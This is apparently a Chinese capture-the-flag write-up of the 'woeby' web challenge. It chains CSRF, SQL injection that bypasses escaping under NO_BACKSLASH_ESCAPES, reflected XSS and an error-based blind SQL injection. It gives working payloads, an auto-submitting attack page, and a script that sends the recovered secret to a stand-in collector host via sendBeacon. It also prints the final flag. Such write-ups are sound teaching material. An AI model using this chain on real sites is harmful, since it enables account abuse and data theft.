# woeby

## 题目简述

题目把复古搜索引擎 Wiby、MySQL 和一个管理员审核机器人封装在同一容器中。攻击者提交 URL 后，机器人以管理员身份登录 `/review/`，点击最后一条待审核链接；链接在新标签页打开，机器人等待 5 秒后回到审核表单继续操作。

flag 被拆成两段并放进不同的表：

- `flag1` 只能由审核端使用的 MySQL 用户 `approver` 查询；
- `flag2` 只能由爬虫端使用的 MySQL 用户 `crawler` 查询。

因此这不是一道单点 SQL 注入题，而是一条“提交恶意页面 → CSRF → SQL 注入 → 同源 XSS → 读取另一个管理员接口”的组合链。仓库只给出两行官方利用提纲，没有完整 exploit；下面的流程根据题目 Dockerfile、机器人代码以及比赛时的 Wiby 源码补全。

## 解题过程

### 固定可复现的上游版本

题目 Dockerfile 直接执行 `git clone https://github.com/wibyweb/wiby.git`，没有固定提交。当前上游源码已经变化，不能把今天的默认分支当成 2022 年赛题源码。结合比赛日期和容器中的路径，本文以赛前最后一个提交 [`5ffb685`](https://github.com/wibyweb/wiby/tree/5ffb6856532e010898de7e1b2f987eeedd71ac6f) 为审计基线。

Dockerfile 还启用了下面的 MySQL 模式：

```ini
sql_mode = "NO_BACKSLASH_ESCAPES"
```

这与 PHP 代码使用 `mysqli_real_escape_string()` 后再手工拼接 SQL 的做法冲突：函数生成的反斜杠转义不再具有原本的引用语义，攻击者可以让双引号提前结束字符串。

### 先从 `tags.php` 取得后半段并建立同源 XSS

`/tags/tags.php` 的关键逻辑可以缩减为：

```php
$url = mysqli_real_escape_string($link, $_POST['url']);
$result = mysqli_query(
    $link,
    'SELECT tags FROM windex WHERE url = "'.$url.'";'
);

while ($row = mysqli_fetch_array($result)) {
    $tagsArray[] = $row['tags'];
}
$tags = $tagsArray[0];
```

查询结果随后未经 HTML 转义便进入属性：

```php
<input type="text" id="tags" name="tags"
       value="<?php echo $tags; ?>">
```

用 `UNION SELECT` 从 `flag2` 取值，并在结果后拼接 `"><script ...>`，便能先闭合 `value` 属性，再执行脚本。为避免 payload 中新增引号再次经过错误的转义，可把 HTML 后缀写成 MySQL 十六进制字面量：

```sql
" UNION SELECT CONCAT(flag,0x<MARKUP_HEX>) FROM flag2;#
```

攻击者页面自动向容器内的接口提交表单。下面的 `TARGET` 应填写机器人可访问的题目站点；原题机器人本身使用 `127.0.0.1`：

```html
<!doctype html>
<form id="csrf" method="post"
      action="http://127.0.0.1/tags/tags.php">
  <input type="hidden" name="url" id="url">
</form>

<script>
const collector = 'https://COLLECTOR';
// 拆开结束标签，避免它提前结束当前 script 元素。
const markup = '\"><script src="' + collector + '/p.js"></scr' + 'ipt>';
const bytes = new TextEncoder().encode(markup);
const hex = [...bytes].map(x => x.toString(16).padStart(2, '0')).join('');

document.querySelector('#url').value =
  `" UNION SELECT CONCAT(flag,0x${hex}) FROM flag2;#`;
document.querySelector('#csrf').submit();
</script>
```

管理员机器人点击该攻击者页面后，表单导航到 `tags.php`。注入查询返回“第二段 flag + script 标签”，反射点触发脚本；此时 `p.js` 在题目站点源下执行，已经可以直接读取 `#tags` 的值，也可以携带管理员会话请求其他接口。

官方说明给出的内联版本同样是 `UNION SELECT CONCAT(flag, ... ) FROM flag2`。这里改用外部脚本和十六进制后缀，是为了把第二段回传与下一阶段的布尔盲注放在同一份代码中，并避开多层 SQL/HTML/JavaScript 引号。

### 利用 `graveyard.php` 的报错差分读取前半段

管理员接口 `/grave/graveyard.php` 直接把两个 POST 参数拼进查询：

```php
$startID = $_POST['startid'];
$endID = $_POST['endid'];

$result = mysqli_query(
    $link,
    "SELECT * FROM graveyard
     WHERE id >= $startID AND id <= $endID"
);
```

`graveyard` 查询必须返回 5 列。官方提纲使用 `EXP(100000)` 构造条件报错：猜测成立时 MySQL 产生浮点溢出，页面进入 `Error fetching index` 分支；猜测不成立时表达式返回 `1`，查询正常完成。

```sql
0 UNION SELECT
  1,
  IF(ORD(SUBSTRING(flag,POS,1)) > MID, EXP(100000), 1),
  1,1,1
FROM flag1;#
```

因为 `p.js` 已在目标源执行，所以可以直接 `fetch()` 该管理员接口并读取响应，不再受同源策略阻挡。下面用二分搜索恢复第一段；已知 flag 格式固定以 `uiuctf{` 开头，因此只需枚举第 8 至第 16 个字符：

```javascript
(async () => {
  const second = document.querySelector('#tags').value;

  async function greaterThan(pos, mid) {
    const injection =
      `0 UNION SELECT 1,` +
      `IF(ORD(SUBSTRING(flag,${pos},1))>${mid},EXP(100000),1),` +
      `1,1,1 FROM flag1;#`;

    const body = new URLSearchParams({
      startid: injection,
      endid: '0'
    });

    const text = await fetch('/grave/graveyard.php', {
      method: 'POST',
      headers: {'Content-Type': 'application/x-www-form-urlencoded'},
      body
    }).then(r => r.text());

    return text.includes('Error fetching index:') ||
           text.includes('DOUBLE value is out of range');
  }

  let first = 'uiuctf{';
  for (let pos = 8; pos <= 16; pos++) {
    let lo = 32;
    let hi = 126;
    while (lo < hi) {
      const mid = Math.floor((lo + hi) / 2);
      if (await greaterThan(pos, mid)) {
        lo = mid + 1;
      } else {
        hi = mid;
      }
    }
    first += String.fromCharCode(lo);
  }

  navigator.sendBeacon(
    'https://COLLECTOR/leak',
    first + second
  );
})();
```

这段脚本最多需要约 $9\times7=63$ 次本地请求，能显著降低撞上机器人 5 秒等待窗口的风险。实战时还应先在本地容器中确认报错正文；如果部署版本隐藏了 MySQL 原始错误，只要“报错页”和“正常队列页”仍可区分，判定条件仍然成立。

仓库元数据给出的两段分别是：

```text
uiuctf{cec1e609c
ef0e05add463c52}
```

拼接得到最终结果：

```text
uiuctf{cec1e609cef0e05add463c52}
```

### 完整触发顺序

1. 在攻击者站点托管 CSRF 页面和 `p.js`，把页面 URL 提交给题目。
2. bot 登录审核后台，点击最后一条待审核 URL。
3. CSRF 页面 POST 到 `tags.php`；SQL 注入读取 `flag2`，未转义的查询结果触发 XSS。
4. 同源的 `p.js` 从 `#tags` 取得第二段，再向 `graveyard.php` 发起报错盲注。
5. 二分恢复 `flag1`，拼接两段并回传至收集端。

## 方法总结

- 核心漏洞链：`NO_BACKSLASH_ESCAPES` 破坏转义假设，`tags.php` 同时存在 SQL 注入和属性型 XSS，XSS 再借管理员会话访问 `graveyard.php` 的报错盲注。
- 权限设计没有阻止利用，反而提示了预期路径：两个数据库用户各自只能查询一半 flag，必须跨越两个页面和两套权限。
- 审计自动构建的旧项目时必须锁定依赖版本。本题 Dockerfile 未固定 Wiby 提交；若不回到赛前源码，文件路径、SQL 语句和反射位置都可能与真实赛题不一致。
- 机器人只等待 5 秒，逐字符线性枚举并不稳妥；利用已知前缀、二分 ASCII 范围，并把所有请求留在容器本地，才能控制总耗时。
